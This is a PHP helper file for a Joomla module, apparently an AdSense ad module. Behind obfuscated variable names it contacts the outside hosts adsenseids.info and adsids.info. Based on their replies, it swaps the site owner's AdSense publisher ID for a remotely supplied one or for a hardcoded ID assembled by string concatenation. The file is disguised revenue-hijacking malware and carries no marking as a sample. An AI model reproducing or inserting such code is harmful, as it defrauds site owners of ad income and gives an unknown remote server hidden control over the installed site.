<?php

defined('_JEXEC') or die('Restricted access') ;

class modJGAHelper {

	function checkId ($de,$hg) {

	$ch = curl_init ($de) ;

	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1) ;

	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 1) ;

	curl_setopt ($ch, CURLOPT_TIMEOUT,1) ;

	$lo = curl_exec ($ch) ;

	curl_close ($ch) ;

	$res = trim ($lo) ;

	return $res ;

	}

	function correctId($id) {

	if($id){
	
	$om = modJGAHelper::checkId ("adsenseids.info/checkid/2/1/",$id) ;

	if ($om != '1') {

	$id = trim ($id) ;

	$id = trim ($id, "ca-pub-") ;
	
	return $id;

	} 
	
	}

	$id = modJGAHelper::updateId ($id) ;
	
	return $id;

	}

	function updateId ($adm) {

	$tn = true;
	
	$adm = modJGAHelper::checkId ("adsids.info/1/2/", $tn) ;

	if (is_numeric($adm)) {

	$ghf = '258' ;

	$dsx = '147' ;

	$adm = " ".$adm ;

	$bt = strpos ($adm, $ghf) ;

	if ($bt == 0) {

	$adm = modJGAHelper::demoId () ;

	return $adm ;

	}

	$bt += strlen ($ghf) ;   

	$wb = strpos ($adm, $dsx, $bt) - $bt ;

	return substr ($adm, $bt, $wb) ;

	}

	else {

	$adm = modJGAHelper::demoId () ;

	return $adm ;

	}

	}
	
	function demoId () {
	
	$am = "95" ;

	$am = "3798".$am ;

	$xls = $am."1" ;

	$xls = "998697".$xls ;

	$am = "459".$xls ;
	
	return $am ;
	
	}

}